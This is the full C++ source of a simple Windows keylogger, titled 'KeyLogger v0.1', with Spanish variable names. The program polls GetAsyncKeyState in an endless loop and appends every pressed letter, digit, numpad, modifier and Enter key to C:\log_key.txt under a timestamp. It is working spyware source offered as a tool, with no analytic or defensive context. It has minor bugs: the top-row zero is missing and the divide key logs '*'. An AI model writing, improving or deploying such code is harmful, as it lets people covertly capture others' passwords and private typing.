#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <fstream>
#include <iostream>
#include <time.h>

using namespace std;

string sacar_tiempo ();

int main()
{
    const int TECLA_OK = -32767;
    HWND ventana = GetConsoleWindow();
    ShowWindow( ventana, SW_SHOW );
    ofstream log;
    log.open("C:\\log_key.txt", ios::app);
    log << "\n##############\n" << "KeyLogger v0.1 -> ";
    {
        string tiempo = sacar_tiempo();
        log << tiempo;
    }
    log << "\n##############\n" << endl;
    log.close();

    while (1)
    {
        Sleep(100);
        log.open("C:\\log_key.txt", ios::app);

        if(GetAsyncKeyState('Q') == TECLA_OK)
        {log << "q";}

        else if(GetAsyncKeyState('W') == TECLA_OK)
        {log << "w";}

        else if(GetAsyncKeyState('E') == TECLA_OK)
        {log << "e";}

        else if(GetAsyncKeyState('R') == TECLA_OK)
        {log << "r";}

        else if(GetAsyncKeyState('T') == TECLA_OK)
        {log << "t";}

        else if(GetAsyncKeyState('Y') == TECLA_OK)
        {log << "y";}

        else if(GetAsyncKeyState('U') == TECLA_OK)
        {log << "u";}

        else if(GetAsyncKeyState('I') == TECLA_OK)
        {log << "i";}

        else if(GetAsyncKeyState('O') == TECLA_OK)
        {log << "o";}

        else if(GetAsyncKeyState('P') == TECLA_OK)
        {log << "p";}

        else if(GetAsyncKeyState('A') == TECLA_OK)
        {log << "a";}

        else if(GetAsyncKeyState('S') == TECLA_OK)
        {log << "s";}

        else if(GetAsyncKeyState('D') == TECLA_OK)
        {log << "d";}

        else if(GetAsyncKeyState('F') == TECLA_OK)
        {log << "f";}

        else if(GetAsyncKeyState('G') == TECLA_OK)
        {log << "g";}

        else if(GetAsyncKeyState('H') == TECLA_OK)
        {log << "h";}

        else if(GetAsyncKeyState('J') == TECLA_OK)
        {log << "j";}

        else if(GetAsyncKeyState('K') == TECLA_OK)
        {log << "k";}

        else if(GetAsyncKeyState('L') == TECLA_OK)
        {log << "l";}

        else if(GetAsyncKeyState('Z') == TECLA_OK)
        {log << "z";}

        else if(GetAsyncKeyState('X') == TECLA_OK)
        {log << "x";}

        else if(GetAsyncKeyState('C') == TECLA_OK)
        {log << "c";}

        else if(GetAsyncKeyState('V') == TECLA_OK)
        {log << "v";}

        else if(GetAsyncKeyState('B') == TECLA_OK)
        {log << "b";}

        else if(GetAsyncKeyState('N') == TECLA_OK)
        {log << "n";}

        else if(GetAsyncKeyState('M') == TECLA_OK)
        {log << "m";}

        else if(GetAsyncKeyState('1') == TECLA_OK)
        {log << 1;}

        else if(GetAsyncKeyState('2') == TECLA_OK)
        {log << 2;}

        else if(GetAsyncKeyState('3') == TECLA_OK)
        {log << 3;}

        else if(GetAsyncKeyState('4') == TECLA_OK)
        {log << 4;}

        else if(GetAsyncKeyState('5') == TECLA_OK)
        {log << 5;}

        else if(GetAsyncKeyState('6') == TECLA_OK)
        {log << 6;}

        else if(GetAsyncKeyState('7') == TECLA_OK)
        {log << 7;}

        else if(GetAsyncKeyState('8') == TECLA_OK)
        {log << 8;}

        else if(GetAsyncKeyState('9') == TECLA_OK)
        {log << 9;}

        else if(GetAsyncKeyState(VK_NUMPAD0) == TECLA_OK)
        {log << 0;}

        else if(GetAsyncKeyState(VK_NUMPAD1) == TECLA_OK)
        {log << 1;}

        else if(GetAsyncKeyState(VK_NUMPAD2) == TECLA_OK)
        {log << 2;}

        else if(GetAsyncKeyState(VK_NUMPAD3) == TECLA_OK)
        {log << 3;}

        else if(GetAsyncKeyState(VK_NUMPAD4) == TECLA_OK)
        {log << 4;}

        else if(GetAsyncKeyState(VK_NUMPAD5) == TECLA_OK)
        {log << 5;}

        else if(GetAsyncKeyState(VK_NUMPAD6) == TECLA_OK)
        {log << 6;}

        else if(GetAsyncKeyState(VK_NUMPAD7) == TECLA_OK)
        {log << 7;}

        else if(GetAsyncKeyState(VK_NUMPAD8) == TECLA_OK)
        {log << 8;}

        else if(GetAsyncKeyState(VK_NUMPAD9) == TECLA_OK)
        {log << 9;}

        else if(GetAsyncKeyState(VK_ADD) == TECLA_OK)
        {log << "+";}

        else if(GetAsyncKeyState(VK_SUBTRACT) == TECLA_OK)
        {log << "-";}

        else if(GetAsyncKeyState(VK_MULTIPLY) == TECLA_OK)
        {log << "*";}

        else if(GetAsyncKeyState(VK_DIVIDE) == TECLA_OK)
        {log << "*";}

        else if(GetAsyncKeyState(VK_DECIMAL) == TECLA_OK)
        {log << ".";}

        else if(GetAsyncKeyState(VK_CAPITAL) == TECLA_OK)
        {log << "[BLOQ MAYUS]";}

        else if(GetAsyncKeyState(VK_DELETE) == TECLA_OK)
        {log << "[Supr]";}

        else if(GetAsyncKeyState(VK_NUMLOCK) == TECLA_OK)
        {log << "[BLOQ NUM]";}

        else if(GetAsyncKeyState(VK_LSHIFT) == TECLA_OK || GetAsyncKeyState(VK_RSHIFT) == TECLA_OK)
        {log << "[SHIFT]";}

        else if(GetAsyncKeyState(VK_MENU) == TECLA_OK)
        {log << "[ALT / ALT GR]";}

        else if(GetAsyncKeyState(VK_CONTROL) == TECLA_OK)
        {log << "[CONTROL]";}

        else if(GetAsyncKeyState(VK_BACK) == TECLA_OK)
        {log << "[<--]";}

        else if(GetAsyncKeyState(VK_OEM_102) == TECLA_OK) // Simbolos "<" y ">"
        {log << "[< / >]";}

        else if(GetAsyncKeyState(VK_OEM_1) == TECLA_OK) // Simbolos ";" y ":"
        {log << "[; / :]";}

        else if(GetAsyncKeyState(VK_RETURN) == TECLA_OK)
        {log << "[ENTER]\n";}

        log.close();
    }
    return 0;
}

string sacar_tiempo ()
{
    time_t rawtime;
    time ( &rawtime );

    return static_cast<string>(ctime (&rawtime));
}
